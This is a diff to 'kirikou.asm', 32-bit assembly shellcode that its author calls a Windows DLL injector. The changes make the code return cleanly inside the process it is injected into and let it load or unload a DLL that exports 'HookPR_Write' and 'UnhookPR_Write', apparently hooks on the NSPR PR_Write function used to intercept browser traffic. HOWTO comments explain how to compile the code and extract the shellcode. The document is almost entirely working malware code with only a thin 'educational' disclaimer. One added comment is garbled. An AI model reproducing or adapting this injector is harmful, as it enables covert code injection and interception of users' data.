@@ -1,12 +1,12 @@
-; +++[ kirikou.asm by h4lf-jiffie (dohmatob elvis dopgima): a smart win32 DLL-injector ]+++
+;    +++[ kirikou.asm by h4lf-jiffie (dohmatob elvis dopgima): a smart win32 DLL-injector ]+++
 ; Tested OK on 7 and xp
 
-; /!\ This is for educationally purposes only, ripped straight-outta my daily ramblings. But that's besides the point ..
+; /!\ This is for educational purposes only, ripped straight-outta my daily ramblings. But that's besides the point ..
 
 ; HOWTO:
-;    0]-- Compile with 'nasm -f bin -o firefighter.bin firefighter.asm'
+;    0]-- Compile with 'nasm -f bin -o kirikou.bin kirikou.asm'
 ;    1]-- Use some opcode wizard to extract the generated shellcode. I use PYHTON.
-;         Viz, 'shellcode = open("firefighter.bin", "rb").read()'. You have the fire!
+;         Viz, 'shellcode = open("kirikou.bin", "rb").read()'. You have the fire!
 
 ; XXX TODO: Use API name hashes instead of strings (les opcodes seront plus discr�t et moins lourd!)
 ; XXX TODO: Question-4-Answer: Shouldn't we suspend all other threads before hooking anything
@@ -29,6 +29,8 @@ BITS 32
 global _start
     
 _start:
+    pushad
+    pushfd
     jmp         entry_point
  
 ;crypto:
@@ -125,8 +127,8 @@ dll_business:
     call        [edi+0x4*3]     ; GetModuleHandleA(dll path)
     test        eax,eax
     jz          load_dll
-    ;jmp         before_unloading_dll
-    jmp         quit
+    jmp         before_unloading_dll
+    ;jmp         quit
     
 load_dll:
     call        get_address_of_useful_kernel32dll_APIs
@@ -135,34 +137,38 @@ load_dll:
     call        [edi+0x4*4]     ; LoadLibraryA(dll path)
     test        eax,eax
     jz          error
+    jmp         after_loading_dll
     
 after_loading_dll:
     mov         edx,eax
     call        load_useful_dll_APIs
     call        get_address_of_useful_dll_APIs
     pop         edi
-    call        [edi]
+    mov         eax,[edi]
+    test        eax,eax
+    jz          error
+    call        eax
     jmp         quit
     
-;before_unloading_dll:
-;    push        eax             ; save
-;    mov         edx,eax
-;    call        load_useful_dll_APIs
-;    call        get_address_of_useful_dll_APIs
-;    pop         edi
-;    call        [edi+0x4]
-;    pop         eax             ; restore
-;    int3
-;    
-;unload_dll:
-;    call        get_address_of_useful_kernel32dll_APIs
-;    pop         edi
-;    push        0x0
-;    push        eax             ; dll handle returned by GetModuleHandleA
-;    int3
-;    call        [edi+0x4*2]     ; FreeLibraryAndExitThread(dll handle,0)
-;    int3
-;    jmp         quit
+before_unloading_dll:
+    push        eax             ; save
+    mov         edx,eax
+    call        load_useful_dll_APIs
+    call        get_address_of_useful_dll_APIs
+    pop         edi
+    mov         eax,[edi+0x4]
+    test        eax,eax
+    jz          error
+    call        eax
+    pop         eax             ; restore
+    jmp         unload_dll
+    
+unload_dll:
+    call        get_address_of_useful_kernel32dll_APIs
+    pop         edi
+    push        eax             ; dll handle returned by GetModuleHandleA
+    call        [edi+0x4*2]     ; FreeLibrary(dll handle)
+    jmp         quit
    
 load_useful_dll_APIs:
     call        get_address_of_useful_dll_APIs
@@ -180,7 +186,8 @@ load_APIs:
     pop         edi 
     pop		esi		; restore
     mov		ebx,[edi]	; ebx  = address of GetProcAddress API   
-    mov         edi,esi	        ; Assuming no API name is less than 4 bytes long (this is reasonable), we'll 
+    mov         edi,esi	        ; Assuming no API name is less than 4 bytes long (this is no loss of generality
+                                ; as we may replace the said names with 4-byte hashes generality as we), we'll 
 				; progressively override the said table of API names (pointed-to by esi) with 
 				; addresses of the loaded APIs. BTW, we won't be needing these names in future!
     
@@ -221,10 +228,13 @@ error:
     jmp		quit
    
 quit:
-    call        get_address_of_useful_kernel32dll_APIs
-    pop         edi
-    push 	0x0
-    call	[edi+0x4*5]	; ExitThread(0x0)	
+    popfd
+    popad
+    ret
+    ;call        get_address_of_useful_kernel32dll_APIs
+    ;pop         edi
+    ;push 	0x0
+    ;call	[edi+0x4*5]	; ExitThread(0x0)	
     
 get_address_of_GetProcAddress:
     pop		esi
@@ -240,7 +250,7 @@ get_address_of_useful_kernel32dll_APIs:
     db 0x0
     db "VirtualProtect"
     db 0x0
-    db "FreeLibraryAndExitThread"
+    db "FreeLibrary"
     db 0x0
     db "GetModuleHandleA"
     db 0x0
@@ -263,7 +273,9 @@ get_address_of_useful_dll_APIs:
     pop         esi
     call        esi
     db 0x0
-    db "HookPR_Write"           ; or some other API exported by your DLL
+    db "HookPR_Write"              ; or some other API exported by your DLL
+    db 0x0
+    db "UnhookPR_Write"
     db 0x0
     db 0x0
     
